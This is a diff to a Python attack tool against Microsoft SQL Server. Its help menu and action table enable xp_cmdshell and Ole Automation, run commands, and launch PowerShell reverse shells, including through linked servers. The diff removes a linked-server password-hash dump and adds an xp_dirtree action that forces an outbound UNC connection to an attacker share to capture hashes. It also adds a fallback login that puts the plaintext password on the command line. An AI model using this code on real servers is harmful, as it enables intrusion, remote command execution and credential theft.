@@ -18,16 +18,12 @@ def attack_mssql(session, action=None, command=None, target=None, lhost=None, lp
         print("  enable_xp                       - Enable xp_cmdshell")
         print("  enable_xp_linked <srv>          - Enable xp_cmdshell on linked server")
         print("  enable_oacreate                 - Enable Ole Automation Procedures")
-        print("  check_xp                        - Check if xp_cmdshell is enabled")
-        print("  check_oacreate                  - Check if Ole Automation Procedures are enabled")
-        print("  check_sysadmin                  - Check if user is sysadmin")
         print("  exec <cmd>                      - Run command via xp_cmdshell")
         print("  fallback_exec <cmd>             - Run command via xp_cmdshell or sp_OACreate fallback")
         print("  revshell                        - PowerShell reverse shell (asks for LHOST/LPORT)")
         print("  linked_revshell <srv>           - Reverse shell via linked server")
-        print("  enum_linked                     - List linked servers")
         print("  query_linked <srv> <cmd>        - Run cmd on linked server via xp_cmdshell")
-        print("  dump_hashes <srv>               - Try to dump login names and hashes from linked server")
+        print("  xp_dirtree <unc_path>           - Trigger outbound connection via xp_dirtree (UNC path)")
         return
 
     full_user = f"{session.domain}/{session.username}"
@@ -45,7 +41,15 @@ def attack_mssql(session, action=None, command=None, target=None, lhost=None, lp
         return output
 
     def exec_sql(sql):
-        return run_command(f"{base_cmd} \"{sql}\"")
+        cmd = f"{base_cmd} \"{sql}\""
+        out, err = run_command(cmd)
+
+        if "Login failed for user" in err or "Login failed" in out:
+            print(yellow("[!] Falling back to SQL Auth (no -windows-auth)"))
+            fallback_cmd = f"impacket-mssqlclient {session.username}:{session.password}@{session.dc_ip} -command \"{sql}\""
+            out, err = run_command(fallback_cmd)
+
+        return out, err
 
     def parse_and_print_table(raw_lines):
         if not raw_lines:
@@ -78,10 +82,7 @@ def attack_mssql(session, action=None, command=None, target=None, lhost=None, lp
     actions = {
         "enable_xp": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
         "enable_oacreate": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;",
-        "check_xp": "RECONFIGURE; SELECT CAST(name AS VARCHAR), CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'xp_cmdshell';",
-        "check_oacreate": "RECONFIGURE; SELECT CAST(name AS VARCHAR), CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'Ole Automation Procedures';",
-        "check_sysadmin": "SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysadmin",
-    }
+                }
 
     if action in actions:
         out, err = exec_sql(actions[action])
@@ -165,13 +166,22 @@ def attack_mssql(session, action=None, command=None, target=None, lhost=None, lp
         parse_and_print_table(clean(out))
         return
 
-    if action == "dump_hashes":
-        if not target:
-            target = input("[?] Enter linked server name: ").strip()
-        query = f"EXEC ('SELECT name, password_hash FROM sys.sql_logins') AT [{target}]"
-        query = query.replace("'", "''")
-        query = f"EXEC ('{query}')"
+    if action == "xp_dirtree":
+        if not command:
+            command = input("[?] Enter UNC path (e.g., \\\\\\\\attacker\\\\share): ").strip()
+
+        # If user included full params: '\\\\ip\\share', 1, 1
+        if command.count(",") == 2:
+            query = f"EXEC master..xp_dirtree {command}"
+        else:
+            unc = escape_sql_string(command.strip("'").strip('"'))
+            query = f"EXEC master..xp_dirtree '{unc}'"
+
         out, err = exec_sql(query)
+        cleaned = clean(out)
         print(green("\n[+] Output:"))
-        parse_and_print_table(clean(out))
+        if not cleaned:
+            print(yellow("[!] No output received or connection failed."))
+        else:
+            parse_and_print_table(cleaned)
         return
